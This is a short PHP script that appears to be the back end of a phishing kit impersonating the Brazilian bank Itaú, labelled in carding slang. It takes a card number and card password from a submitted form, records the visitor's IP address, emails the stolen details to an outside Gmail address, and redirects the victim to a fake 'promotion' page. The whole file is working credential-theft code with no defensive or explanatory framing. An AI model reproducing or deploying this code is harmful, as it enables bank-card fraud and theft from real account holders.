<?php



$numc=$_POST["numc"];
$passc=$_POST["passc"];


$ip_usuario = $_SERVER['REMOTE_ADDR'];

$stringData = "

==============[ CONSULTÁVEL ITAU NO PENTE PARTE 1 ]=================

 NUMERO DO CARTAO: $numc
 SENHA DO CARTÃO: $passc
 
============================================================
";

$ss = "CONSULTÁVEL ITAU NO PENTE PARTE 1 IP: $ip_usuario ";

header("Location:promocao.htm");

mail('contatoh0awk@gmail.com',$ss,$stringData);

?>